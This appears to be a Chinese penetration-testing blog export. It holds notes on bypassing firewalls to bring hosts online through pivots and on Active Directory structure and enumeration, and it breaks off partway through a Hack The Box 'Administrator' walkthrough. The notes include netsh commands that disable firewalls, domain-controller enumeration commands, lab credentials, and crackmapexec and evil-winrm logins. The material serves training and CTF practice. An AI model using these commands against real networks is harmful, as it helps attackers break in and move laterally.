src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772200601-4dccb3f4-d2b8-4a61-84f8-aa532bb575ff.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772247956-2fdc01c9-aee3-41ca-9378-7a89315fb25c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772327920-3eef69f6-02a2-4a2c-8cbd-089fbd657049.png"></p><p>此时再让sql2.22上线</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773244500-dbab805e-0793-4fad-864b-43e1b87f5f73.png"></p><p>多协议限制，使用未被限制的协议或者反向连接绕过。（隧道技术）</p><p>全部协议限制，使用放弃或者反向连接绕过，但正常不会将所以协议都封闭的。</p><h3 id="出站限制："><a href="#出站限制：" class="headerlink" title="出站限制："></a>出站限制：</h3><p>参考上面使用正向连接绕过。</p><p>出入均限制：</p><p>单协议限制，使用其它协议绕过。（隧道技术）</p><p>多协议限制，使用未被限制的协议绕过。（隧道技术）</p><p>全部协议限制，使用放弃绕过，但正常不会将所以协议都封闭的。</p><p>单层目标机防火墙开启 上线解决方案：</p><p>1、命令关闭防火墙</p><p>2、反向中转连接上线</p><p>3、利用隧道技术上线（规则决定）</p><h3 id="单层跳板机防火墙开启上线解决方案："><a href="#单层跳板机防火墙开启上线解决方案：" class="headerlink" title="单层跳板机防火墙开启上线解决方案："></a>单层跳板机防火墙开启上线解决方案：</h3><p>1、命令关闭防火墙</p><p>2、正向监听连接上线</p><p>3、利用隧道技术上线（规则决定）</p><h3 id="双层防火墙开启上线解决方案："><a href="#双层防火墙开启上线解决方案：" class="headerlink" title="双层防火墙开启上线解决方案："></a>双层防火墙开启上线解决方案：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773373028-5c999943-8224-45ca-90a4-1266822b1f56.png"></p><p>此时双反向就行不行了， 因为2.22的反向出是需要到2.11的，此时对于2.11来说2.22的反向就相当于入</p><p>1、命令关闭防火墙（连上web关闭他的防火墙此时可以像单层跳板机对2.22进行上线）</p><p>在真实情况中就是都有防火墙的情况下，先拿下一台机器进行命令执行关闭防火墙，拿下后就是单层防火墙了</p><p>2、SMB协议通讯上线（默认放行）</p><p>3、利用隧道技术上线（规则决定）</p><p>防火墙实验（适用场景）：</p><p>1、内网无域环境下</p><p>2、内网有域环境下（强制策略同步）</p><p>gpupdate&#x2F;force</p><p>Windows防火墙命令：</p><p>参考：<a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><p>查看当前防火墙状态：netsh advfirewall show allprofiles</p><p>关闭防火墙：netsh advfirewall set allprofiles state off</p><p>开启防火墙：netsh advfirewall set allprofiles state on</p><p>恢复初始防火墙设置：netsh advfirewall reset</p><p>启用桌面防火墙: netsh advfirewall set allprofiles state on</p><p>设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p><p>如果设置为拒绝使用blockinbound,blockoutbound</p><h3 id="域防火墙"><a href="#域防火墙" class="headerlink" title="域防火墙"></a>域防火墙</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734961544506-d07eeec5-ca89-4283-bfe8-63b35017a736.png"></p><p>在域控创建个防火墙编辑一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734963840046-6c95890d-2cd7-4c63-a9e7-267f59f5bda3.png"></p><p>配置一下防火墙</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734964118032-63f3404b-7f27-4044-bcc8-6f3b0be7a28d.png">改成默认值（入站检测出站不检测）</p><h3 id="如何判断目标服务器出网协议"><a href="#如何判断目标服务器出网协议" class="headerlink" title="如何判断目标服务器出网协议"></a>如何判断目标服务器出网协议</h3><p>icmp就看能不能ping</p><p>dns就看域名能不能解析</p><p>ssh就看ssh连接会不会被阻止</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域基础</title>
      <link href="/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="域知识"><a href="#域知识" class="headerlink" title="域知识"></a>域知识</h2><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577556466-cb10f698-06dd-46f7-bf69-5fdaddac9a67.png"><br><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577562443-33a590cd-f9fb-4fab-88f8-79d2370e87dc.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577568404-a29634f7-b743-44af-bdb2-47ef3521360b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577573678-73369367-1afb-41e4-97af-b06050405889.png"></p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734577581620-45aac3c4-76c5-4248-8cb1-06583df0c520.png"></p><h3 id="工作组："><a href="#工作组：" class="headerlink" title="工作组："></a>工作组：</h3><p>将不同的计算机按照功能分别列入不同的工作组。想要访问某个部门的资源，只要在“网络”里面双击该部门的工作组名。工作组就像一个可以自由进入和退出的社团，方便同组的计算机相互访问，工作组没有集中管理作用，工作组里的计算机都是相互对等的（即没有服务器和客户机之分）。对局域网中的计算机进行分类，使得网络更有序。计算机的管理依然是各自为政，所有计算机依然是对等的，松散会员制，可以随意加入和退出，且不同工作组之间的共享资源可以相互访问。</p><h3 id="内网域："><a href="#内网域：" class="headerlink" title="内网域："></a>内网域：</h3><p>分类：单域、子域、父域、域树、域森林、DNS域名服务器</p><p>“域”是一个有安全边界的计算机组合（一个域中的用户无法访问另一个域中的资源），域内资源由一台域控制器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。</p><p>优点：通过组策略来统一管理。</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>单域：即只有一个域的网络环境，一般需要两台DC，一台DC，另一台备用DC（容灾）</p><p>dns可能就是域控</p><h4 id="父子域"><a href="#父子域" class="headerlink" title="父子域"></a>父子域</h4><p>父子域：类比公司总部和公司分部的关系，总部的域称为父域，各分部的域称为该域的子域。使用父子域的好处：</p><p>• 减小了域之间信息交互的压力（域内信息交互不会压缩，域间信息交互可压缩）</p><p>• 不同的子域可以指定特定的安全策略</p><p>父子域中域名使用一个.表示一个层次，类似于DNS域名表示方式，子域只能使用父域的名字作为域名后缀</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树：多个域通过建立信任关系组成的集合。若两个域之间需要相互访问，需要建立信任关系（Trust Relation），通过信任关系可以将父子域连接成树状结构</p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>域森林：多个域树通过建立信任关系组成的集合。</p><p>域名服务器：实现域名到IP地址的转换。由于域中计算机使用DNS来定位DC、服务器和其他计算机的，所以域的名字就是DNS域的名字。</p><p>内网渗透中，大都是通过寻找DNS服务器来确定域控制器位置（因为DNS服务器和域控制器通常配置在一台机器上）</p><h3 id="域内权限："><a href="#域内权限：" class="headerlink" title="域内权限："></a>域内权限：</h3><p>• 域本地组：</p><p>• 多域用户访问单域资源</p><p>• （访问同一个域），主要用于授予本域内资源的访问权限，可以从任何域中添加用户账号、通用组和全局组。域本地组无法嵌套在其他组中</p><p>• 全局组：</p><p>• 单域用户访问多域资源</p><p>• （必须是同一个域中的用户），只能在创建该全局组的域中添加用户和全局组，但可以在域森林中的任何域内指派权限，也可以嵌套在其他组中</p><p>• 通用组：多域用户访问多域资源，成员信息不保存在域控制器中，而是保存在全局编录（GC）中，任何变化都会导致全林复制</p><p>域本地组：来自全林作用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林作用于全林</p><p>本地域组的权限</p><p>Administrators（管理员组） ————最重要的权限</p><p>Remote Desktop Users（远程登录组）</p><p>Print Operators（打印机操作员组）</p><p>Account Operators（帐号操作员组）</p><p>Server Operaters（服务器操作员组）</p><p>Backup Operators（备份操作员组）</p><p>全局组、通用组的权限</p><p>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</p><p>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</p><p>Schema Admins（架构管理员组）————最重要的权限</p><p>Domain Users（域用户组)</p><p>通常DNS服务器与域控制器会在同一台机器上</p><p>一个域内至少需要两台DC，需要一台用作备份</p><h3 id="A-G-DL-P策略："><a href="#A-G-DL-P策略：" class="headerlink" title="A-G-DL-P策略："></a>A-G-DL-P策略：</h3><p>A：用户账户</p><p>G：全局组</p><p>DL：域本地组</p><p>P：许可，资源权限</p><p>先将用户账号添加至全局组中，再将全局组添加至域本地组，为域本地组分配资源权限。</p><p>1、域环境应用</p><p>• 账号集中管理</p><p>• 软件集中管理</p><p>• 环境集中管理</p><p>• 增强统一安全性</p><p>2、域环境架构</p><p>域控制器</p><p>成员服务器</p><p>客户机</p><p>独立服务器</p><p>见图：（单域，父域，子域，域树，域森林）</p><p>单域是指网络环境中只有一个域，建立一个单独的域足以。</p><p>父子域在一个域中划分出多个域，被划分的域为父域，划分出来的域为子域。</p><p>域树中的命名空间具有连续性，并且域名层次越深，级别越低。</p><p>域林是指一个或多个没有形成连续名字空间的域树组成的域树集合。</p><p>3、域环境搭建</p><p>准备工作：</p><p>关闭防火墙并改计算机名</p><p>计算机网络配置静态IP和DNS</p><p>安装工作：</p><p>DC安装域控和DNS服务</p><p>提升到DC域控配置域名</p><p>加入工作：</p><p>DC上添加域内用户</p><p>修改主机名称及加入域</p><p>4、域环境差异</p><p>加入主机存在域内和域外：</p><p>用户切换</p><p>加入主机域内用户被控制</p><p>域内权限：</p><p>域本地组：来自全林作用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林作用于全林</p><p>本地域组的权限</p><p>Administrators（管理员组） ————最重要的权限</p><p>Remote Desktop Users（远程登录组）</p><p>Print Operators（打印机操作员组）</p><p>Account Operators（帐号操作员组）</p><p>Server Operaters（服务器操作员组）</p><p>Backup Operators（备份操作员组）</p><p>全局组、通用组的权限</p><p>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</p><p>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</p><p>Schema Admins（架构管理员组）————最重要的权限</p><p>Domain Users（域用户组)</p><p>A-G-DL-P策略：</p><p>A 代表用户账号（Account）。</p><p>G 代表全局组（Global Group）。</p><p>DL 代表域本地组（Domain Local Group）。</p><p>P 代表资源访问权限（Permission）。</p><p>A-G-DL-P策略是一种将用户账号添加到全局组中，然后将全局组添加到域本地组中，并为域本地组分配资源访问权限的策略。这种策略使得来自不同域的用户能够通过全局组和域本地组的组织方式，访问本地域中的资源。</p><p>5、域环境安全</p><p>信息收集：了解当前网络架构和权限分布</p><p>权限提升：将当前控制权限提升解决限制</p><p>代理隧道：解决内网域中出网和通讯限制</p><p>横向移动：利用漏洞和口令等扩大后续战果</p><p>权限维持：植入后门或票据等进行后续控制</p><h3 id="演示：单域"><a href="#演示：单域" class="headerlink" title="演示：单域"></a>演示：单域</h3><h4 id="1、如何判断在域内"><a href="#1、如何判断在域内" class="headerlink" title="1、如何判断在域内"></a>1、如何判断在域内</h4><p>如果在域外，需要做域内渗透测试，需要满足两个条件（2选1）：</p><p>1、取得主机系统权限（administrator&#x2F;system）</p><p>可以使用mimikatz等工具读取密码，再切换到域内账户</p><p>2、取得主机域内权限</p><p>因为加入域后，受dc控制</p><p>软件策略 网络策略  更改策略</p><p>看域外</p><p>whoami</p><p>看域内（没有域内权限时会被拒绝）</p><p>net user &#x2F;domain</p><h4 id="2、如何定位域控DC"><a href="#2、如何定位域控DC" class="headerlink" title="2、如何定位域控DC"></a>2、如何定位域控DC</h4><font style="color:rgb(14, 156, 229);">  </font>net time /domain<p>net group”domain controllers” &#x2F;domain</p><p>nltest &#x2F;dsgetdc:域名</p><p>nltest &#x2F;dclist:域名</p><p>或者运行cs等工具一些插件</p><h4 id="3、如何获取其他信息"><a href="#3、如何获取其他信息" class="headerlink" title="3、如何获取其他信息"></a>3、如何获取其他信息</h4><p>其他信息：用户及组，网络架构等</p><p>手工工具：常见命令，工具插件等</p><h3 id="父子域-1"><a href="#父子域-1" class="headerlink" title="父子域"></a>父子域</h3><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734585880126-f5b28997-165a-4745-956f-97823fe9140d.png"></p><h4 id="1、如何判断在单域内"><a href="#1、如何判断在单域内" class="headerlink" title="1、如何判断在单域内"></a>1、如何判断在单域内</h4><p>net time &#x2F;domain看指向谁</p><h4 id="2、如何判断在父子域内"><a href="#2、如何判断在父子域内" class="headerlink" title="2、如何判断在父子域内"></a>2、如何判断在父子域内</h4><p>子域能看父域，不能管理</p><p>net view &#x2F;domain 能看但不一定能执行成功，服务器如果没开这个服务就不能执行</p><p>需要启动Computer Browser服务，但是 这个命令会展现当前所有的父子域，如何判断具体在那个域中呢？</p><p>whoami看账户前面的域名称</p><h4 id="3、如何定位当前域控DC"><a href="#3、如何定位当前域控DC" class="headerlink" title="3、如何定位当前域控DC"></a>3、如何定位当前域控DC</h4><p>同上 </p><p>域内要注意dns解析的问题</p><h4 id="4、如何获取当前其他信息"><a href="#4、如何获取当前其他信息" class="headerlink" title="4、如何获取当前其他信息"></a>4、如何获取当前其他信息</h4><p>域渗透基础命令</p><p><a href="https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g">https://mp.weixin.qq.com/s/128Ap8ohEBDweg0jNM-T5g</a></p><h3 id="域森林-1"><a href="#域森林-1" class="headerlink" title="域森林"></a>域森林</h3><p>域与域配置信任关系 </p><p><img src="https://image.baidu.com/search/down?url=https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734590228218-1409a999-1ace-44bc-9c8a-3fefbc212cbf.png"></p><p>演示：</p><h4 id="1、如何判断在单域内-1"><a href="#1、如何判断在单域内-1" class="headerlink" title="1、如何判断在单域内"></a>1、如何判断在单域内</h4><p>net view 一个</p><h4 id="2、如何判断在父子域内-1"><a href="#2、如何判断在父子域内-1" class="headerlink" title="2、如何判断在父子域内"></a>2、如何判断在父子域内</h4><p>net view 多个</p><p>其他命令运行提示多个子域</p><h4 id="3、如何判断在域树林内"><a href="#3、如何判断在域树林内" class="headerlink" title="3、如何判断在域树林内"></a>3、如何判断在域树林内</h4><p>net view 多个</p><p>其他命令运行提示多个子域</p><h4 id="4、如何判断在域森林内"><a href="#4、如何判断在域森林内" class="headerlink" title="4、如何判断在域森林内"></a>4、如何判断在域森林内</h4><p>net view 无规则</p><p>用户与本机用户不一致</p><p>域内用户名不在当前域 在另外的域里面 典型的域森林</p><h4 id="5、域树和域林对比前面"><a href="#5、域树和域林对比前面" class="headerlink" title="5、域树和域林对比前面"></a>5、域树和域林对比前面</h4><h4 id="5、如何定位当前域控DC"><a href="#5、如何定位当前域控DC" class="headerlink" title="5、如何定位当前域控DC"></a>5、如何定位当前域控DC</h4><h4 id="6、如何获取当前其他信息"><a href="#6、如何获取当前其他信息" class="headerlink" title="6、如何获取当前其他信息"></a>6、如何获取当前其他信息</h4><p>其他信息：用户及组，网络架构等</p><p>手工工具：常见命令，工具插件等</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb-Administrator</title>
      <link href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"/>
      <url>/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/</url>
      
        <content type="html"><![CDATA[<p>s is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich用户名：Olivia<br>密码：ichliebedich</p><p>nmap -sCV -A -T4 -Pn 10.10.11.42</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 15:42 CST</span><br><span class="line">Nmap scan report for 10.10.11.42</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-14 14:42:58Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=12/14%OT=21%CT=1%CU=42122%PV=Y%DS=2%DC=T%G=Y%TM=675</span><br><span class="line">OS:D375F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=RD%II=I%TS=</span><br><span class="line">OS:A)SEQ(SP=107%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108</span><br><span class="line">OS:%TI=RD%CI=RD%II=I%TS=C)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11</span><br><span class="line">OS:%O4=M53ANW8ST11%O5=M53ANW8ST11%O6=M53AST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W</span><br><span class="line">OS:4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(</span><br><span class="line">OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=</span><br><span class="line">OS:%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">OS:T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S</span><br><span class="line">OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC</span><br><span class="line">OS:K=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h00m04s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-12-14T14:44:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 23/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   768.22 ms 10.10.16.1</span><br><span class="line">2   359.07 ms 10.10.11.42</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 136.19 seconds</span><br></pre></td></tr></table></figure><p>ftp尝试失败</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734162976598-e15a6716-76f3-460b-9a25-ef1a7755de1b.png"></p><h3 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h3><p>SMB 是一种网络文件共享协议，允许应用程序通过网络读取和写入文件、请求远程服务以及进行其他网络操作。</p><p>利用提供的账号密码，使用<code>CrackMapExec</code>工具对<code>SMB 服务</code>进行枚举，验证提供的凭据是否可用，并查看是否存在有用的共享目录。</p><p>CrackMapExec 是一个常用的渗透测试工具，主要用于 Windows 网络的枚举和利用。它特别适合对 SMB、RDP 和 WinRM 服务进行广泛扫描、认证、执行命令和枚举共享目录等操作</p><p>结果显示，用户<code>Olivia</code> 的 SMB 登录有效，但未发现有用的共享目录，仅能读取常见的<code>NETLOGON</code> 和<code>SYSVOL</code></p><p>crackmapexec smb 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’ –shares</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163151310-eef8289b-a853-43e6-bd6a-bee65807651e.png"></p><h3 id="WinRM-登录olivia"><a href="#WinRM-登录olivia" class="headerlink" title="WinRM 登录olivia"></a><strong>WinRM 登录olivia</strong></h3><p>WinRM 是 Microsoft 提供的远程管理协议，允许远程执行命令、启动进程、管理系统设置等，类似于 Unix 系统中的 SSH</p><p>使用 CrackMapExec 验证目标主机的<code>WinRM 服务</code>（端口 5985），发现凭据有效并成功登录。</p><p>返回结果表明可以通过 WinRM 获取远程访问权限</p><p>crackmapexec winrm 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734163334873-7aa7887c-79a3-46b4-b875-a595a6cd1e94.png"></p><p>使用<code>evil-winrm</code>登录，使用<code>evil-winrm</code> 进一步获取目标主机的权限和用户信息</p><p>并且通过运行<code>whoami /all</code> 命令查看用户权限</p><p>evil-winrm -i 10.10.11.42 -u ‘Olivia’ -p ‘ichliebedich’</p><p>并且通过运行<code>whoami /all</code> 命令查看用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;Olivia&#x27; -p &#x27;ichliebedich&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name            SID</span><br><span class="line">==================== ============================================</span><br><span class="line">administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID          Attributes</span><br><span class="line">=========================================== ================ ============ ==================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; </span><br></pre></td></tr></table></figure><p>结果发现<code>Olivia</code> 用户具有基本的操作权限，并且拥有<code>SeMachineAccountPrivilege</code>，允许其将计算机帐户添加到域中。</p><h3 id="域用户爆破"><a href="#域用户爆破" class="headerlink" title="域用户爆破"></a>域用户爆破</h3><p>成功登录目标主机后，使用<code>net user</code> 命令对域内的用户进行枚举。列出当前域控制器上存在的所有用户账户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            alexander                benjamin</span><br><span class="line">emily                    emma                     ethan</span><br><span class="line">Guest                    krbtgt                   michael</span><br><span class="line">olivia</span><br><span class="line">The command completed with one or more 